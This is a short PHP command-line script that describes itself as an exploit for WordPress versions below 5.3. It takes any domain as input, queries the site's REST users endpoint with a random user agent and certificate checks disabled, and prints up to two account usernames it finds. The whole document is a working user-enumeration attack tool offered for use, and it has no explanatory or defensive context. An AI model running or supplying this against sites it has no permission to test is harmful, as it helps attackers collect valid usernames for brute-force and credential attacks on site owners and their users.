<?php
// This Exploit Has Found In Wordpress Version < 5.3
error_reporting(0);
include 'random-useragent.php';
function curl($url){
	$setopt = array(
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_TIMEOUT => 60,
		CURLOPT_USERAGENT => getUserAgent(),
		CURLOPT_SSL_VERIFYHOST => false,
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_FOLLOWLOCATION => false,
	);
	$ch = curl_init();
	curl_setopt_array($ch, $setopt);
	$exe = curl_exec($ch);
	curl_close($ch);
	return $exe;
}
$domain = readline('Input Your Domain : ');
if(!preg_match('#^http(s)?://#',$domain)){
	$url = "http://".$domain;
}
else {
	$url = $domain;
}
$exploit = $url.'/wp-json/wp/v2/users';
if (curl($exploit)) {
	$decode = json_decode(file_get_contents($exploit), true);
	echo "Domain : $url\n";
	if ($decode[0]['name'] == null) {
		echo 'Username Not Found';
	}
	else {
		if ($decode[1]['name'] == null) {
			echo 'Username : '.$decode[0]['name']."\n";
		}
		else {
			echo 'Username : '.$decode[0]['name']."\n";
			echo 'Username : '.$decode[1]['name']."\n";
		}
	}
}
?>